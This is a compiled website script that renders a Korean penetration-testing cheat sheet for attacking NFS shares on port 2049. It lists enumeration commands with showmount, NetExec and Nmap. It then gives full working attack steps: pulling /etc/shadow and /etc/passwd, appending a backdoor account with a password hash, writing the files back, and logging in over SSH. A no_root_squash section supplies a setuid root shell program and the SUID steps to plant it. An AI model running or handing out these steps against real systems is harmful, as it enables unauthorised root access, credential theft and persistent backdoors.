"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[5615],{3620:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>r,default:()=>h,frontMatter:()=>c,metadata:()=>t,toc:()=>i});const t=JSON.parse('{"id":"Cheatsheet/services/nfs","title":"NFS - 2049","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/Cheatsheet/services/nfs.md","sourceDirName":"Cheatsheet/services","slug":"/Cheatsheet/services/nfs","permalink":"/my-docusaurus-page/Cheatsheet/services/nfs","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":8,"frontMatter":{"sidebar_position":8},"sidebar":"tutorialSidebar","previous":{"title":"MSSQL - 1433","permalink":"/my-docusaurus-page/Cheatsheet/services/mssql"},"next":{"title":"MySQL - 3306","permalink":"/my-docusaurus-page/Cheatsheet/services/mysql"}}');var o=s(4848),l=s(8453);const c={sidebar_position:8},r="NFS - 2049",a={},i=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"showmount",id:"showmount",level:2},{value:"\ub9c8\uc6b4\ud2b8",id:"\ub9c8\uc6b4\ud2b8",level:2},{value:"SUID \uc124\uc815",id:"suid-\uc124\uc815",level:2},{value:"NetExec",id:"netexec",level:2},{value:"\uacf5\uc720 \uc5f4\uac70",id:"\uacf5\uc720-\uc5f4\uac70",level:3},{value:"\ud30c\uc77c \ucc98\ub9ac",id:"\ud30c\uc77c-\ucc98\ub9ac",level:3},{value:"Root \ud30c\uc77c \uc2dc\uc2a4\ud15c \ud0c8\ucd9c (Escape)",id:"root-\ud30c\uc77c-\uc2dc\uc2a4\ud15c-\ud0c8\ucd9c-escape",level:3},{value:"Nmap",id:"nmap",level:2},{value:"\uad8c\ud55c \uc0c1\uc2b9 \uae30\ubc95",id:"\uad8c\ud55c-\uc0c1\uc2b9-\uae30\ubc95",level:2},{value:"no_root_squash \uc545\uc6a9",id:"no_root_squash-\uc545\uc6a9",level:3},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function d(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.header,{children:(0,o.jsx)(n.h1,{id:"nfs---2049",children:"NFS - 2049"})}),"\n",(0,o.jsx)(n.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.strong,{children:"\ud3ec\ud2b8"}),": 2049"]}),"\n",(0,o.jsx)(n.p,{children:"NFS(Network File System)\ub294 \ub124\ud2b8\uc6cc\ud06c\ub97c \ud1b5\ud574 \ud30c\uc77c \uc2dc\uc2a4\ud15c\uc744 \uacf5\uc720\ud558\ub294 \ud504\ub85c\ud1a0\ucf5c\uc785\ub2c8\ub2e4."}),"\n",(0,o.jsx)(n.h2,{id:"showmount",children:"showmount"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# NFS \uacf5\uc720 \ubaa9\ub85d \ud655\uc778\n/usr/sbin/showmount -e <RHOST>\nsudo showmount -e <RHOST>\n"})}),"\n",(0,o.jsx)(n.h2,{id:"\ub9c8\uc6b4\ud2b8",children:"\ub9c8\uc6b4\ud2b8"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# NFS \ub9c8\uc6b4\ud2b8\nsudo mount -t nfs -o vers=4,nolock <RHOST>:/<FOLDER> /PATH/TO/FOLDER/<FOLDER>\n\n# NFSv3 \ub9c8\uc6b4\ud2b8\nsudo mount -t nfs -o vers=3,nolock <RHOST>:/<FOLDER> /PATH/TO/FOLDER/<FOLDER>\n"})}),"\n",(0,o.jsx)(n.h2,{id:"suid-\uc124\uc815",children:"SUID \uc124\uc815"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# SUID \ube44\ud2b8 \uc124\uc815 (\uad8c\ud55c \uc0c1\uc2b9\uc6a9)\nchown root:root sid-shell\nchmod +s sid-shell\n"})}),"\n",(0,o.jsx)(n.h2,{id:"netexec",children:"NetExec"}),"\n",(0,o.jsx)(n.h3,{id:"\uacf5\uc720-\uc5f4\uac70",children:"\uacf5\uc720 \uc5f4\uac70"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8 \uc5f4\uac70\nnetexec nfs <RHOST>\n\n# \uacf5\uc720 \ubaa9\ub85d\nnetexec nfs <RHOST> --shares\n\n# \uacf5\uc720 \uc0c1\uc138 \uc5f4\uac70\nnetexec nfs <RHOST> --enum-shares\n\n# \ud2b9\uc815 \uacf5\uc720\uc758 \ud30c\uc77c \ubaa9\ub85d\nnetexec nfs <RHOST> --share '/var/nfs/general' --ls '/'\n"})}),"\n",(0,o.jsx)(n.h3,{id:"\ud30c\uc77c-\ucc98\ub9ac",children:"\ud30c\uc77c \ucc98\ub9ac"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc\nnetexec nfs <RHOST> --get-file /PATH/TO/FOLDER/<FILE> <FILE>\n\n# \ud30c\uc77c \uc5c5\ub85c\ub4dc\nnetexec nfs <RHOST> --put-file <FILE> /PATH/TO/FOLDER/<FILE>\n"})}),"\n",(0,o.jsx)(n.h3,{id:"root-\ud30c\uc77c-\uc2dc\uc2a4\ud15c-\ud0c8\ucd9c-escape",children:"Root \ud30c\uc77c \uc2dc\uc2a4\ud15c \ud0c8\ucd9c (Escape)"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# \ub8e8\ud2b8 \ub514\ub809\ud1a0\ub9ac \uc811\uadfc\nnetexec nfs <RHOST> --ls '/'\n\n# /etc/shadow \ub2e4\uc6b4\ub85c\ub4dc\nnetexec nfs <RHOST> --get-file '/etc/shadow' etc_shadow\n\n# /etc/passwd \ub2e4\uc6b4\ub85c\ub4dc\nnetexec nfs <RHOST> --get-file '/etc/passwd' etc_passwd\n\n# \ubc31\ub3c4\uc5b4 \uc0ac\uc6a9\uc790 \ucd94\uac00\necho 'backdoor$6$QF0YMBn9$Gj7DTxYtq7ie3zTOSSHrFsp2DpWqTpV0xunqkGxU7UlK8tZkW6zzFNRy8GwsVqYFxflK0zPbAAKQt6VwAhWqsyO:18000:0:99999:7:::' >> etc_shadow\necho 'backdoor:x:1003:1001:,,,:/home/backdoor:/bin/bash' >> etc_passwd\n\n# \uc218\uc815\ub41c \ud30c\uc77c \uc5c5\ub85c\ub4dc\nnetexec nfs <RHOST> --put-file etc_shadow '/etc/shadow'\nnetexec nfs <RHOST> --put-file etc_passwd '/etc/passwd'\n\n# SSH \ub85c\uadf8\uc778\nssh backdoor@<RHOST>\n# Password: P@ssword123!\n"})}),"\n",(0,o.jsx)(n.h2,{id:"nmap",children:"Nmap"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# NFS \ud3ec\ud2b8 \uc2a4\uce94\nsudo nmap -p2049 -sV <RHOST>\n\n# NFS \uacf5\uc720 \uc5f4\uac70\nsudo nmap -p111,2049 --script nfs-ls <RHOST>\nsudo nmap -p111,2049 --script nfs-showmount <RHOST>\nsudo nmap -p111,2049 --script nfs-statfs <RHOST>\n"})}),"\n",(0,o.jsx)(n.h2,{id:"\uad8c\ud55c-\uc0c1\uc2b9-\uae30\ubc95",children:"\uad8c\ud55c \uc0c1\uc2b9 \uae30\ubc95"}),"\n",(0,o.jsx)(n.h3,{id:"no_root_squash-\uc545\uc6a9",children:"no_root_squash \uc545\uc6a9"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'# NFS \uacf5\uc720 \ub9c8\uc6b4\ud2b8\nmkdir /tmp/nfs\nsudo mount -t nfs <RHOST>:/share /tmp/nfs\n\n# SUID \ubc14\uc774\ub108\ub9ac \ucef4\ud30c\uc77c \ubc0f \uc5c5\ub85c\ub4dc\ncat > shell.c << EOF\n#include <stdio.h>\n#include <unistd.h>\nint main(void) {\n    setuid(0);\n    setgid(0);\n    system("/bin/bash");\n}\nEOF\n\ngcc shell.c -o shell\nsudo cp shell /tmp/nfs/\nsudo chown root:root /tmp/nfs/shell\nsudo chmod +s /tmp/nfs/shell\n\n# \ud0c0\uac9f\uc5d0\uc11c \uc2e4\ud589\n./shell\n'})}),"\n",(0,o.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:"no_root_squash: root \uad8c\ud55c \uc720\uc9c0 (\uad8c\ud55c \uc0c1\uc2b9 \uac00\ub2a5)"}),"\n",(0,o.jsx)(n.li,{children:"root_squash: root\ub97c nobody\ub85c \ub9e4\ud551 (\uae30\ubcf8\uac12)"}),"\n",(0,o.jsx)(n.li,{children:"/etc/exports \ud30c\uc77c \ud655\uc778"}),"\n",(0,o.jsx)(n.li,{children:"RPC \ud3ec\ud2b8 111\ub3c4 \ud568\uaed8 \ud655\uc778"}),"\n",(0,o.jsx)(n.li,{children:"SUID \ubc14\uc774\ub108\ub9ac\ub97c \ud1b5\ud55c \uad8c\ud55c \uc0c1\uc2b9"}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>c,x:()=>r});var t=s(6540);const o={},l=t.createContext(o);function c(e){const n=t.useContext(l);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:c(e.components),t.createElement(l.Provider,{value:n},e.children)}}}]);